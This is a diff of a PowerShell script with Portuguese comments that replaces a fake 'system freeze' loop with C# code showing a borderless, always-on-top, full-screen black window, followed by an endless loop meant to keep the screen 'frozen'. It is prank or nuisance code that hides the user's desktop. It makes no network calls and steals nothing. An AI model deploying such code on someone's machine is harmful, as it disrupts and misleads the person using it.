@@ -1,17 +1,25 @@
-# Função para simular o travamento do sistema
-Function Simulate-SystemFreeze {
-    Write-Host "Simulando o travamento do sistema... (Esse processo não pode ser revertido sem reiniciar o computador)"
+Add-Type -TypeDefinition @"
+using System;
+using System.Drawing;
+using System.Windows.Forms;
 
-    # Criar um processo de loop infinito que consome 100% da CPU
-    $process = Start-Process powershell -ArgumentList "-NoExit", "-Command", {
-        while ($true) {
-            # Simula o uso de 100% da CPU com um loop infinito
-            [System.Threading.Thread]::Sleep(1000)
-        }
+public class ScreenFreeze {
+    public static void FreezeScreen() {
+        // Criar uma janela sem bordas que cobre toda a tela
+        Form freezeForm = new Form();
+        freezeForm.FormBorderStyle = FormBorderStyle.None;
+        freezeForm.WindowState = FormWindowState.Maximized;
+        freezeForm.TopMost = true; // Fica sempre na frente
+        freezeForm.BackColor = Color.Black; // Cor de fundo que simula "congelamento"
+        freezeForm.ShowDialog();
     }
-
-    Write-Host "Sistema travado. O script precisa ser reiniciado para reverter a situação."
 }
+"@
 
-# Chama a função que simula o travamento
-Simulate-SystemFreeze
+# Executar a função que simula o congelamento da tela
+[ScreenFreeze]::FreezeScreen()
+
+# Impedir que o script termine, forçando a tela a continuar "congelada"
+while ($true) {
+    Start-Sleep -Seconds 1
+}
